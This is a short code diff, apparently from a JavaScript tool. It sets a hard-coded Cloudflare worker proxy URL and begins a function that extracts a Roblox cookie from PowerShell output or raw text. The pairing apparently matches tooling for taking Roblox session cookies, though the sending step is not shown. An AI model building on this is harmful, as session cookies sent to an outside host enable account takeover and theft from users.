@@ -1,4 +1,4 @@
-const PROXY_URL = "https://your-proxy-worker.workers.dev/"; // Replace with your proxy URL
+const PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/"; 
 
 // 1. Extract cookie from PowerShell or raw string
 function extractRobloxCookie(input) {
